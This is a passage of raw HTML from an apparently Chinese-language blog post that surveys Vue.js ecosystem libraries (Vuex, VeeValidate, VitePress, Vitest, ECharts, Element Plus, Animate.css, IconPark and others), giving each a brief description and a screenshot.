srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="D8Dnn"></a></p><h2 id="（2）Vuex"><a href="#（2）Vuex" class="headerlink" title="（2）Vuex"></a>（2）Vuex</h2><p>Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658240637248-ebca700a-c553-47f0-a1b0-f4c29c182a4b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658240637248-ebca700a-c553-47f0-a1b0-f4c29c182a4b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="fBZ7u"></a></p><h2 id="（3）vuex-persist"><a href="#（3）vuex-persist" class="headerlink" title="（3）vuex-persist"></a>（3）vuex-persist</h2><p>vuex-persistedstate 是一个支持 Typescript 的 Vuex 插件，使你能够将应用程序的状态保存到持久存储中，例如 Cookies 或 localStorage。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658241184423-55a6ddf9-29fe-425c-8fe6-6e99b04fe714.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658241184423-55a6ddf9-29fe-425c-8fe6-6e99b04fe714.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="EFDw2"></a></p><h1 id="2-表单"><a href="#2-表单" class="headerlink" title="2. 表单"></a>2. 表单</h1><p><a name="Hl6Xo"></a></p><h2 id="（1）VeeValidate"><a href="#（1）VeeValidate" class="headerlink" title="（1）VeeValidate"></a>（1）VeeValidate</h2><p>vee-validate 是 Vue.js 的表单验证库，它允许验证输入并以熟悉的声明式样式或使用组合函数构建更好的表单 UI。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244322020-a5806224-d508-42c7-b040-dcf5a2f227b4.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244322020-a5806224-d508-42c7-b040-dcf5a2f227b4.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="OkqPQ"></a></p><h2 id="（2）vue-form-making"><a href="#（2）vue-form-making" class="headerlink" title="（2）vue-form-making"></a>（2）vue-form-making</h2><p>vue-form-making 是一个基于 vue 和 element-ui 实现的可视化表单设计器，使用了最新的前端技术栈，内置了 i18n 国际化解决方案，可以让表单开发简单而高效。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244554598-4310d3e7-3091-4310-9c3b-70e5de91317b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244554598-4310d3e7-3091-4310-9c3b-70e5de91317b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="vMXrC"></a></p><h2 id="（3）FormKit"><a href="#（3）FormKit" class="headerlink" title="（3）FormKit"></a>（3）FormKit</h2><p>FormKit 是一个面向 Vue 开发人员的表单创作框架，它使构建高质量的生产就绪表单的速度提高了 10 倍。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244690324-e745f913-a5f9-47e2-854f-9bae60ecef5f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244690324-e745f913-a5f9-47e2-854f-9bae60ecef5f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="iYuba"></a></p><h1 id="3-文档"><a href="#3-文档" class="headerlink" title="3. 文档"></a>3. 文档</h1><p><a name="diAh4"></a></p><h2 id="（1）VitePress"><a href="#（1）VitePress" class="headerlink" title="（1）VitePress"></a>（1）VitePress</h2><p>VitePress 是 VuePress 的继承者，建立在 vite 之上。目前，正处于 alpha 阶段。它已经适合开箱即用的文档使用，但配置和主题 API 可能仍会在次要版本之间发生变化。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658241882514-095613ba-77a2-4793-9c49-b5a3dd9d0045.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658241882514-095613ba-77a2-4793-9c49-b5a3dd9d0045.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="rI8Zb"></a></p><h2 id="（2）VuePress"><a href="#（2）VuePress" class="headerlink" title="（2）VuePress"></a>（2）VuePress</h2><p>VuePress 是一个基于 Vue 的轻量级静态网站生成器，以及为编写技术文档而优化的默认主题。 它是为了满足 Vue 自己的子项目文档的需求而创建的。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658241791565-51890648-63e4-47bc-8581-479e5a4aeafc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658241791565-51890648-63e4-47bc-8581-479e5a4aeafc.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="S7MNQ"></a></p><h2 id="（3）Gridsome"><a href="#（3）Gridsome" class="headerlink" title="（3）Gridsome"></a>（3）Gridsome</h2><p>Gridsome 是一个基于 Vue.js 构建的 Jamstack 框架，它让开发人员可以轻松地构建静态生成的网站和应用程序，这些网站和应用程序天生速度快。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658247087501-fe2c275f-e7be-4011-8618-6e3f6da4ac9b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658247087501-fe2c275f-e7be-4011-8618-6e3f6da4ac9b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="KD3jT"></a></p><h1 id="4-测试"><a href="#4-测试" class="headerlink" title="4. 测试"></a>4. 测试</h1><p><a name="dyNRp"></a></p><h2 id="（1）Vitest"><a href="#（1）Vitest" class="headerlink" title="（1）Vitest"></a>（1）Vitest</h2><p>Vitest 是一个由 Vite 提供支持的极速单元测试框架。其和 Vite 的配置、转换器、解析器和插件保持一致，具有开箱即用的 TypeScript &#x2F; JSX 支持。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658242281270-7d006534-6f79-48cc-ac3a-1ab58b1af72e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658242281270-7d006534-6f79-48cc-ac3a-1ab58b1af72e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="lvZ5P"></a></p><h2 id="（2）Jest"><a href="#（2）Jest" class="headerlink" title="（2）Jest"></a>（2）Jest</h2><p>Jest 是一个全面的 JavaScript 测试解决方案，专注于简洁明快。适用于大多数 JavaScript 项目。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658242600801-d9bcf342-7c55-426c-8694-4da4b9653686.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658242600801-d9bcf342-7c55-426c-8694-4da4b9653686.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ebERg"></a></p><h2 id="（3）Mocha"><a href="#（3）Mocha" class="headerlink" title="（3）Mocha"></a>（3）Mocha</h2><p>mocha 是一个功能丰富的 javascript 测试框架，运行在 node.js 和浏览器中，使异步测试变得简单有趣。Mocha 测试连续运行，允许灵活和准确的报告，同时将未捕获的异常映射到正确的测试用例。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658242834462-44236ea1-0527-46b9-8ecb-e51ad65ef5ad.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658242834462-44236ea1-0527-46b9-8ecb-e51ad65ef5ad.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="GkI1w"></a></p><h1 id="5-可视化"><a href="#5-可视化" class="headerlink" title="5. 可视化"></a>5. 可视化</h1><p><a name="WHM2e"></a></p><h2 id="（1）Vue-ChartJS"><a href="#（1）Vue-ChartJS" class="headerlink" title="（1）Vue ChartJS"></a>（1）Vue ChartJS</h2><p>vue-chartjs 是一个 Vue 对于 Chart.js 的封装，让用户可以在 Vue 中轻松使用 Chart.js，很简单的创建可复用的图表组件，非常适合需要简单的图表并尽可能快地运行的人。 vue-chartjs 抽象了基本逻辑，同时也暴露了 Chart.js 对象，让用户获得最大的灵活性。它支持 Vue 3 和 Vue 2。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658243328737-ef5294c0-4185-41a0-9567-421c5f583e29.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658243328737-ef5294c0-4185-41a0-9567-421c5f583e29.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="KuLA0"></a></p><h2 id="（2）Apache-ECharts"><a href="#（2）Apache-ECharts" class="headerlink" title="（2）Apache ECharts"></a>（2）Apache ECharts</h2><p>Apache ECharts 是一款基于 Javascript 的数据可视化图表库，提供直观，生动，可交互，可个性化定制的数据可视化图表。它是用纯 JavaScript 编写的，基于 zrender，是一个全新的轻量级画布库。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658243634219-bdf272dd-a253-4d6d-9eca-bc1dd0292d32.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658243634219-bdf272dd-a253-4d6d-9eca-bc1dd0292d32.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="rqUhQ"></a></p><h2 id="（3）Vue-ECharts"><a href="#（3）Vue-ECharts" class="headerlink" title="（3）Vue-ECharts"></a>（3）Vue-ECharts</h2><p>Vue-ECharts 是 Apache ECharts 的 Vue.js 组件。使用 Apache ECharts 5，同时支持 Vue.js 2&#x2F;3。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658243888856-bb73498b-d853-43a7-b10a-e1c2e1fd0e28.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658243888856-bb73498b-d853-43a7-b10a-e1c2e1fd0e28.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="NHWLF"></a></p><h2 id="（4）Trois"><a href="#（4）Trois" class="headerlink" title="（4）Trois"></a>（4）Trois</h2><p>Trois 是一个基于 Three.JS 的 Vue 3 可视化库，它是一个流行的 WebGL 库。 Three.JS 对桌面和移动设备都有很好的支持。 该库允许我们使用 VueJS 组件轻松为网站创建 3D 效果。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658245369189-f6e12dc5-63a8-436a-829d-5832407e4054.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658245369189-f6e12dc5-63a8-436a-829d-5832407e4054.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="LCfns"></a></p><h1 id="6-组件"><a href="#6-组件" class="headerlink" title="6. 组件"></a>6. 组件</h1><p><a name="CZ9Hk"></a></p><h2 id="（1）Vue-Grid-Layout"><a href="#（1）Vue-Grid-Layout" class="headerlink" title="（1）Vue Grid Layout"></a>（1）Vue Grid Layout</h2><p>vue-grid-layout 是一个网格布局系统，类似于 Gridster，用于 Vue.js。 <br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244016211-ff1879e4-67aa-4b8c-b66c-4a4a8527bd09.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244016211-ff1879e4-67aa-4b8c-b66c-4a4a8527bd09.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="WblsY"></a></p><h2 id="（2）Vue-Draggable"><a href="#（2）Vue-Draggable" class="headerlink" title="（2）Vue Draggable"></a>（2）Vue Draggable</h2><p>Vue Draggable 是一个基于 Sortable.js 的 Vue 拖拽组件。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244136335-2177ad07-f931-4128-b3b6-759d17f87f5d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244136335-2177ad07-f931-4128-b3b6-759d17f87f5d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="yejts"></a></p><h2 id="（3）Vue-Tour"><a href="#（3）Vue-Tour" class="headerlink" title="（3）Vue Tour"></a>（3）Vue Tour</h2><p>Vue Tour 是一个轻量级、简单且可定制的导览插件，可与 Vue.js 一起使用。它提供了一种快速简便的方法来指导用户完成你的应用程序。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244866751-55d7e307-be4d-458e-8728-68e668d16875.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244866751-55d7e307-be4d-458e-8728-68e668d16875.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（4）Swiper.js</strong><br />Swiper 是一款免费以及轻量级的移动设备触控滑块的框架，使用硬件加速过渡。主要使用与移动端的网站、网页应用程序，以及原生的应用程序。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244941098-1d009d31-ee3e-4ddb-a30d-47084d4fdc87.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658244941098-1d009d31-ee3e-4ddb-a30d-47084d4fdc87.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="AEitf"></a></p><h2 id="（5）vue-easytable"><a href="#（5）vue-easytable" class="headerlink" title="（5）vue-easytable"></a>（5）vue-easytable</h2><p>该库提供了一个功能齐全且高度可定制的表格组件&#x2F;数据网格。它支持许多功能，如虚拟滚动、列固定、标题固定、标题分组、过滤器、排序、单元格省略号、行扩展、行复选框等。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658246173207-b8a6cdb5-ba20-4cfa-a43e-d6ab58cd817a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658246173207-b8a6cdb5-ba20-4cfa-a43e-d6ab58cd817a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ymS5x"></a></p><h1 id="7-UI-组件"><a href="#7-UI-组件" class="headerlink" title="7. UI 组件"></a>7. UI 组件</h1><p><a name="YPNro"></a></p><h2 id="（1）Element-Plus"><a href="#（1）Element-Plus" class="headerlink" title="（1）Element Plus"></a>（1）Element Plus</h2><p>Element Plus，由饿了么大前端团队开源出品的一套为开发者、设计师和产品经理准备的基于 Vue 3.0 的组件库，Element Plus 是基于 Vue3 面向设计师和开发者的组件库，提供了配套设计资源，帮助你的网站快速成型。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658236849005-d22c295f-4efa-4bab-aeb7-e845a79840cd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658236849005-d22c295f-4efa-4bab-aeb7-e845a79840cd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="OvSFU"></a></p><h2 id="（2）Vuetify"><a href="#（2）Vuetify" class="headerlink" title="（2）Vuetify"></a>（2）Vuetify</h2><p>Vuetify 是一个基于 Vue.js 精心打造 UI 组件库，整套 UI 设计为 Material 风格。能够让没有任何设计技能的开发者创造出时尚的 Material 风格界面。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658236907279-ca0790f0-a9da-4b06-9a05-aacda6929c5a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658236907279-ca0790f0-a9da-4b06-9a05-aacda6929c5a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="yf71Z"></a></p><h2 id="（3）Vant"><a href="#（3）Vant" class="headerlink" title="（3）Vant"></a>（3）Vant</h2><p>Vant 是一套轻量、可靠的移动端组件库。通过 Vant，可以快速搭建出风格统一的页面，提升开发效率，支持 Vue 3。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658237411801-6a82c357-2294-4489-8652-d0d7152f8333.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658237411801-6a82c357-2294-4489-8652-d0d7152f8333.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="l6DSl"></a></p><h2 id="（4）Naive-UI"><a href="#（4）Naive-UI" class="headerlink" title="（4）Naive UI"></a>（4）Naive UI</h2><p>Naive UI 是一款基于当前比较新的 Vue 3.0&#x2F;TypeScript 技栈开发的前端 UI 组件库。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658237717771-66f44c93-f6de-432a-8fea-74ac4f4c2a1c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658237717771-66f44c93-f6de-432a-8fea-74ac4f4c2a1c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="EWKvZ"></a></p><h1 id="8-动画"><a href="#8-动画" class="headerlink" title="8. 动画"></a>8. 动画</h1><p><a name="RlDbD"></a></p><h2 id="（1）Animate-css"><a href="#（1）Animate-css" class="headerlink" title="（1）Animate.css"></a>（1）Animate.css</h2><p>animate.css 是一个使用 CSS3 的 animation 制作的动画效果的 CSS 集合，里面预设了很多种常用的动画，且使用非常简单。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658237855634-9e42760e-330e-4174-9672-31fd389f0b40.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658237855634-9e42760e-330e-4174-9672-31fd389f0b40.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="zAOTJ"></a></p><h2 id="（2）Greensock"><a href="#（2）Greensock" class="headerlink" title="（2）Greensock"></a>（2）Greensock</h2><p>GreenSock 是一个 JavaScript 动画库，可轻松对 HTML 元素进行动画处理。 用于创建高性能，零依赖性，跨浏览器动画，声称在超过 400 万个网站中使用。 <br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238145678-e4baca0c-0a7d-45be-8741-246abfb71bbe.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238145678-e4baca0c-0a7d-45be-8741-246abfb71bbe.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="FyOdE"></a></p><h2 id="（3）Popmotion"><a href="#（3）Popmotion" class="headerlink" title="（3）Popmotion"></a>（3）Popmotion</h2><p>Popmotion 是一个只有 12KB 的 JavaScript 运动引擎，可以用来实现动画，物理效果和输入跟踪。原生的 DOM 支持：CSS，SVG，SVG 路径和 DOM 属性的支持，开箱即用。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238362468-c97fe309-02bc-4cfe-8818-601d03e0ac8d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238362468-c97fe309-02bc-4cfe-8818-601d03e0ac8d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="Uo62F"></a></p><h2 id="（4）Vue-Kinesis"><a href="#（4）Vue-Kinesis" class="headerlink" title="（4）Vue Kinesis"></a>（4）Vue Kinesis</h2><p>Vue Kinesis 支持使用 Vue.js 轻松创建复杂的交互式动画，其支持 Vue 3。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238626259-c41830ba-7488-4d4b-bdad-afeb51426550.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238626259-c41830ba-7488-4d4b-bdad-afeb51426550.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="Ptqhj"></a></p><h1 id="9-图标"><a href="#9-图标" class="headerlink" title="9. 图标"></a>9. 图标</h1><p><a name="Mrqcu"></a></p><h2 id="（1）IconPark"><a href="#（1）IconPark" class="headerlink" title="（1）IconPark"></a>（1）IconPark</h2><p>IconPark 提供超过 2400 个高质量图标，还提供了每个图标的含义和来源的描述，便于开发者使用。除此之外，该网站还可以自定义图标，这是与其他图标网站与众不同的地方。该图标库是字节跳动旗下的技术驱动图标样式的开源图标库。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238892165-34d2445d-91f9-4184-8b2b-6a6f1a1b24e2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238892165-34d2445d-91f9-4184-8b2b-6a6f1a1b24e2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="wrSdh"></a></p><h2 id="（2）Font-Awesome"><a href="#（2）Font-Awesome" class="headerlink" title="（2）Font Awesome"></a>（2）Font Awesome</h2><p>Font Awesome 提供了可缩放的矢量图标，可以使用 CSS 所提供的所有特性对它们进行更改，包括：大小、颜色、阴影或者其它任何支持的效果。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238892145-d72b28e0-8701-464e-b691-8b938b91fdc2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238892145-d72b28e0-8701-464e-b691-8b938b91fdc2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="NXs0v"></a></p><h2 id="（3）Ionicons"><a href="#（3）Ionicons" class="headerlink" title="（3）Ionicons"></a>（3）Ionicons</h2><p>Ionicons 是一个完全开源的图标集，是知名混合开发框架 Ionic Framework 内置的图标库，包含 1300 个设计优雅、风格统一的高质量图标，能满足大多数的业务场景。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238892220-50e3abe8-88ce-4cb5-a169-5852a9168ea0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238892220-50e3abe8-88ce-4cb5-a169-5852a9168ea0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="Ytpi7"></a></p><h2 id="（4）Bootstrap-Icons"><a href="#（4）Bootstrap-Icons" class="headerlink" title="（4）Bootstrap Icons"></a>（4）Bootstrap Icons</h2><p>Bootstrap Icons 是 Bootstrap 开源的 SVG 